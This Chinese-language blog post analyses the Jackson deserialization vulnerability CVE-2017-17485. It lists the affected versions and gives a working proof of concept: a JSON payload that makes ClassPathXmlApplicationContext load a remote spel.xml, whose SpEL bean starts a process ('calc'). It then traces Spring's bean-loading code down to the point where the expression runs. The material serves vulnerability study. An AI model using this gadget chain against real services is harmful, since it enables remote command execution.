# Jackson反序列化（三）

  
  
&lt;!--more--&gt;  
## 0x01 漏洞描述  
本次 Jackson 反序列化漏洞基于`org.springframework.context.support.ClassPathXmlApplicationContext`的利用链。在开启`enableDefaultTyping()`或是用有问题的`@JsonTypeInfo`注解的前提下  
可以通过 jackson-databind来滥用 Spring 的 SpEL 表达式注入漏洞来触发 Jackson 反序列化漏洞的，从而达到任意命令执行的效果。  
### 影响版本  
Jackson 2.7系列&lt;2.7.9.2  
Jackson 2.8系列&lt;2.8.11  
Jackson 2.9系列&lt;2.9.4  
### 利用限制  
需要额外的 jar 包，并非完全的 Jackson 漏洞  
环境所有的pom.xml  
```xml  
&lt;dependencies&gt;    
  &lt;dependency&gt;    
    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;    
    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;    
    &lt;version&gt;2.7.9.1&lt;/version&gt;    
  &lt;/dependency&gt;    
  &lt;dependency&gt;    
    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;    
    &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;    
    &lt;version&gt;2.7.9&lt;/version&gt;    
  &lt;/dependency&gt;    
  &lt;dependency&gt;    
    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;    
    &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;    
    &lt;version&gt;2.7.9&lt;/version&gt;    
  &lt;/dependency&gt;    
  &lt;dependency&gt;    
    &lt;groupId&gt;org.springframework&lt;/groupId&gt;    
    &lt;artifactId&gt;spring-context&lt;/artifactId&gt;    
    &lt;version&gt;5.0.2.RELEASE&lt;/version&gt;    
  &lt;/dependency&gt;    
  &lt;dependency&gt;    
    &lt;groupId&gt;org.springframework&lt;/groupId&gt;    
    &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;    
    &lt;version&gt;5.0.2.RELEASE&lt;/version&gt;    
  &lt;/dependency&gt;    
  &lt;dependency&gt;    
    &lt;groupId&gt;org.springframework&lt;/groupId&gt;    
    &lt;artifactId&gt;spring-core&lt;/artifactId&gt;    
    &lt;version&gt;5.0.2.RELEASE&lt;/version&gt;    
  &lt;/dependency&gt;    
  &lt;dependency&gt;    
    &lt;groupId&gt;org.springframework&lt;/groupId&gt;    
    &lt;artifactId&gt;spring-expression&lt;/artifactId&gt;    
    &lt;version&gt;5.0.2.RELEASE&lt;/version&gt;    
  &lt;/dependency&gt;    
  &lt;dependency&gt;    
    &lt;groupId&gt;commons-logging&lt;/groupId&gt;    
    &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;    
    &lt;version&gt;1.2&lt;/version&gt;    
  &lt;/dependency&gt;    
&lt;/dependencies&gt;  
```  
## 0x02 漏洞复现  
`ClassPathXmlApplicationContext`这个类是用来加载一些 XML 资源的，而最后的攻击实现也是如此  
Poc.java  
```java  
package org;    
    
import com.fasterxml.jackson.databind.ObjectMapper;    
    
import java.io.IOException;    
    
public class Poc {    
    public static void main(String[] args) throws Exception{    
        //CVE-2017-17485    
        String payload = &#34;[\&#34;org.springframework.context.support.ClassPathXmlApplicationContext\&#34;, \&#34;http://127.0.0.1:8888/spel.xml\&#34;]&#34;;    
        ObjectMapper mapper = new ObjectMapper();    
        mapper.enableDefaultTyping();    
        try {    
            mapper.readValue(payload, Object.class);    
        } catch (IOException e) {    
            e.printStackTrace();    
        }    
    }    
        
}  
```  
spel.xml，放置在第三方 Web 服务器中，看到 id 为 pb 的 bean 标签，指定类为`java.lang.ProcessBuilder`，在其中有两个子标签，`constuctor-arg`标签设置参数值为具体的命令，`property`标签调用`start()`方法  
spel.xml  
```xml  
&lt;beans xmlns=&#34;http://www.springframework.org/schema/beans&#34;    
       xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;    
       xsi:schemaLocation=&#34;    
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&#34;&gt;    
    &lt;bean id=&#34;pb&#34; class=&#34;java.lang.ProcessBuilder&#34;&gt;    
        &lt;constructor-arg value=&#34;calc&#34; /&gt;    
        &lt;property name=&#34;whatever&#34; value=&#34;#{ pb.start() }&#34;/&gt;    
    &lt;/bean&gt;    
&lt;/beans&gt;  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411140008786.png)
## 0x03 漏洞分析  
这里的 XML 内容解析，到 SpEL 表达式注入，其实是涉及到 Spring 的 IOC 原则。  
`ClassPathXmlApplicationContext`的构造函数。在`ClassPathXmlApplicationContext`中有很多构造方法，其中有一个是传入一个字符串的（即配置文件的相对路径），但最终是调用的的下面这个构造。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411142007847.png)
Spring在这里先创建解析器，解析`configLocations`，跟进`refresh()`方法，`refresh()`方法做的核心业务是刷新容器（启动容器都会调用该方法），跟进之后的核心代码如下  
```java  
public void refresh() throws BeansException, IllegalStateException {    
    synchronized (this.startupShutdownMonitor) {    
       // Prepare this context for refreshing.    
       prepareRefresh();    
    
       // Tell the subclass to refresh the internal bean factory.    
       ConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory();    
    
       // Prepare the bean factory for use in this context.    
       prepareBeanFactory(beanFactory);    
    
       try {    
          // Allows post-processing of the bean factory in context subclasses.    
          postProcessBeanFactory(beanFactory);    
    
          // Invoke factory processors registered as beans in the context.    
          invokeBeanFactoryPostProcessors(beanFactory);    
    
          // Register bean processors that intercept bean creation.    
          registerBeanPostProcessors(beanFactory);    
    
          // Initialize message source for this context.    
          initMessageSource();    
    
          // Initialize event multicaster for this context.    
          initApplicationEventMulticaster();    
    
          // Initialize other special beans in specific context subclasses.    
          onRefresh();    
    
          // Check for listener beans and register them.    
          registerListeners();    
    
          // Instantiate all remaining (non-lazy-init) singletons.    
          finishBeanFactoryInitialization(beanFactory);    
    
          // Last step: publish corresponding event.    
          finishRefresh();    
       }  
         
.....  
```  
先跟进`obtainFreshBeanFactory()`方法，这个方法是一个典型的模版方法模式的实现，第一步是准备初始化容器环境，第二步，创建 BeanFactory 对象、加载解析 xml 并封装成 BeanDefinition 对象都是在这一步完成的。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411142010061.png)
跟进，判断如果 BeanFactory 不为空，则清楚 BeanFactory 和里面的实例，接着创建了一个 DefaultListableBeanFactory 对象并传入到了`loadBeanDefinitions`方法中，这也是一个模版方法，因为我们的配置不只有 xml，还有注解等。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411142013452.png)
在整体封装完毕之后，这里的 XML 就已经被加载进来了，把 inputSource 封装成 Document 文件对象。核心代码如下  
```java  
public int loadBeanDefinitions(EncodedResource encodedResource) throws BeanDefinitionStoreException {  
	try {  
		//获取Resource对象中的xml文件流对象  
		InputStream inputStream = encodedResource.getResource().getInputStream();  
		try {  
			//InputSource是jdk中的sax xml文件解析对象  
			InputSource inputSource = new InputSource(inputStream);  
			if (encodedResource.getEncoding() != null) {  
				inputSource.setEncoding(encodedResource.getEncoding());  
			}  
			//主要看这个方法  
			return doLoadBeanDefinitions(inputSource, encodedResource.getResource());  
		}  
		finally {  
			inputStream.close();  
		}  
	}  
}  
  
protected int doLoadBeanDefinitions(InputSource inputSource, Resource resource)  
		throws BeanDefinitionStoreException {  
  
	try {  
		//把inputSource 封装成Document文件对象，这是jdk的API  
		Document doc = doLoadDocument(inputSource, resource);  
  
		//主要看这个方法，根据解析出来的document对象，拿到里面的标签元素封装成BeanDefinition  
		int count = registerBeanDefinitions(doc, resource);  
		if (logger.isDebugEnabled()) {  
			logger.debug(&#34;Loaded &#34; &#43; count &#43; &#34; bean definitions from &#34; &#43; resource);  
		}  
		return count;  
	}  
}  
  
public int registerBeanDefinitions(Document doc, Resource resource) throws BeanDefinitionStoreException {  
	// 创建DefaultBeanDefinitionDocumentReader对象，并委托其做解析注册工作  
	BeanDefinitionDocumentReader documentReader = createBeanDefinitionDocumentReader();  
	int countBefore = getRegistry().getBeanDefinitionCount();  
	//主要看这个方法，需要注意createReaderContext方法中创建的几个对象  
	documentReader.registerBeanDefinitions(doc, createReaderContext(resource));  
	return getRegistry().getBeanDefinitionCount() - countBefore;  
}  
  
public XmlReaderContext createReaderContext(Resource resource) {  
	// XmlReaderContext对象中保存了XmlBeanDefinitionReader对象和DefaultNamespaceHandlerResolver对象的引用，在后面会用到  
	return new XmlReaderContext(resource, this.problemReporter, this.eventListener,  
			this.sourceExtractor, this, getNamespaceHandlerResolver());  
}  
  
```  
接着来看下 DefaultBeanDefinitionDocumentReader 是如何解析的  
```java  
protected void doRegisterBeanDefinitions(Element root) {  
	// 创建了BeanDefinitionParserDelegate对象  
	BeanDefinitionParserDelegate parent = this.delegate;  
	this.delegate = createDelegate(getReaderContext(), root, parent);  
  
	// 如果是Spring原生命名空间，首先解析 profile标签，这里不重要  
	if (this.delegate.isDefaultNamespace(root)) {  
		String profileSpec = root.getAttribute(PROFILE_ATTRIBUTE);  
		if (StringUtils.hasText(profileSpec)) {  
			String[] specifiedProfiles = StringUtils.tokenizeToStringArray(  
					profileSpec, BeanDefinitionParserDelegate.MULTI_VALUE_ATTRIBUTE_DELIMITERS);  
			// We cannot use Profiles.of(...) since profile expressions are not supported  
			// in XML config. See SPR-12458 for details.  
			if (!getReaderContext().getEnvironment().acceptsProfiles(specifiedProfiles)) {  
				if (logger.isDebugEnabled()) {  
					logger.debug(&#34;Skipped XML bean definition file due to specified profiles [&#34; &#43; profileSpec &#43;  
							&#34;] not matching: &#34; &#43; getReaderContext().getResource());  
				}  
				return;  
			}  
		}  
	}  
  
	preProcessXml(root);  
  
	//主要看这个方法，标签具体解析过程  
	parseBeanDefinitions(root, this.delegate);  
	postProcessXml(root);  
  
	this.delegate = parent;  
}  
  
```  
这里的调用栈是这么走下来的  
```java  
doRegisterBeanDefinitions:129, DefaultBeanDefinitionDocumentReader (org.springframework.beans.factory.xml)  
registerBeanDefinitions:98, DefaultBeanDefinitionDocumentReader (org.springframework.beans.factory.xml)  
registerBeanDefinitions:507, XmlBeanDefinitionReader (org.springframework.beans.factory.xml)  
doLoadBeanDefinitions:391, XmlBeanDefinitionReader (org.springframework.beans.factory.xml)  
```  
在这个方法中重点关注preProcessXml，parseBeanDefinitions、postProcessXml 三个方法，其中 preProcessXml 和 postProcessXml 都是空方法，意思是在标签前后我们可以自己扩展需要执行的操作，也是一个模版方法模式，体现了 Spring 的高扩展性。然后进入 parseBeanDefinitions 方法看具体是怎么解析标签的。  
```java  
protected void parseBeanDefinitions(Element root, BeanDefinitionParserDelegate delegate) {  
	if (delegate.isDefaultNamespace(root)) {  
		NodeList nl = root.getChildNodes();  
		for (int i = 0; i &lt; nl.getLength(); i&#43;&#43;) {  
			Node node = nl.item(i);  
			if (node instanceof Element) {  
				Element ele = (Element) node;  
				if (delegate.isDefaultNamespace(ele)) {  
  
					//默认标签解析  
					parseDefaultElement(ele, delegate);  
				}  
				else {  
  
					//自定义标签解析  
					delegate.parseCustomElement(ele);  
				}  
			}  
		}  
	}  
	else {  
		delegate.parseCustomElement(root);  
	}  
}  
  
```  
这里有两种标签的解析：Spring 原生标签和自定义标签  
```java  
// 自定义标签  
&lt;context:component-scan/&gt;  
  
// 默认标签  
&lt;bean:/&gt;  
```  
可以看到`http://www.springframework.org/schema/beans`所对应的就是默认标签。接着，我们进入`parseDefaultElement`方法  
```java  
private void parseDefaultElement(Element ele, BeanDefinitionParserDelegate delegate) {  
	//import标签解析   
	if (delegate.nodeNameEquals(ele, IMPORT_ELEMENT)) {  
		importBeanDefinitionResource(ele);  
	}  
	//alias标签解析  
	else if (delegate.nodeNameEquals(ele, ALIAS_ELEMENT)) {  
		processAliasRegistration(ele);  
	}  
	//bean标签  
	else if (delegate.nodeNameEquals(ele, BEAN_ELEMENT)) {  
		processBeanDefinition(ele, delegate);  
	}  
	else if (delegate.nodeNameEquals(ele, NESTED_BEANS_ELEMENT)) {  
		// recurse  
		doRegisterBeanDefinitions(ele);  
	}  
}  
  
```  
这里面主要是对 import、alias、bean 标签的解析以及 beans 的字标签的递归解析，最终会将这些标签属性的值装入到 BeanDefinition 对象中，这里接近能够拿到一个封装好的 XML document 了，并且被解析为 Bean。  
回到最开始的地方，关注一下漏洞点，其中有一个`invokeBeanFactoryPostProcessors()`方法，顾名思义，就是调用上下文中注册为`beans`的工厂处理器  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411142100079.png)
继续跟下去，`invokeBeanFactoryPostProcessors()`方法中调用了`getBeanNamesForType()`函数来获取 Bean 名类型  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411142102851.png)
往下，进一步调用`doGetBeanNamesForType()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411142104544.png)
在 `doGetBeanNamesForType()` 方法中，调用 `isFactoryBean()` 判断当前`beanName`是否为`FactoryBean`，此时`beanName`参数值为`pb`，`mbd`参数中识别到`bean`标签中的类为 `java.lang.ProcessBuilder`：  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411142113894.png)
在`isFactoryBean()`方法中，调用`predictBeanType()`方法获取 Bean 类型  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411142114326.png)
跟下去，`AbstractBeanFactory.resolveBeanClass()-&gt;AcstractBeanfactory.doResolveBeanClass()`，用来解析 Bean 类，其中调用了`evaluateBeanDefinitionString()`方法来执行 Bean 定义的字符串内容，此时 className 参数指向`java.lang.ProcessBuilder`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411142117821.png)
同时这里`resloveBeanClass()`方法是用于指定解析器的，跟进去看一下  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411142135426.png)
跟进 `doResolveBeanClass()` 方法，进一步解析`Bean`，随后跟进`AbstarctBeanFactory.evaluateBeanDefinitionString()`方法，其中调用了`this.beanExpressionResolver.evaluate()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411142144794.png)
此时`this.beanExpressionResolve`指向的是`StandardBeanExpressionResolver`，也就是说已经调用到对应的 SpEL 表达式解析器了  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411142148079.png)
跟进`StandardBeanExpressionResolover.evaluate()`方法，发现调用了`Expression.getValue()`方法即 SpEL 表达式执行的方法，其中 sec 参数是我们可以控制的内容即由`spel.xml`解析得到的 SpEL 表达式：  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411142205799.png)
后续就是 SpEL 表达式注入漏洞导致的任意代码执行了。  
简单来说，就是传入的需要被反序列化的`org.springframework.context.support.ClassPathXmlApplicationContext`类，它的构造函数存在 SpEL 注入漏洞，进而导致可被利用触发 Jackson 反序列化漏洞。  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%89/  

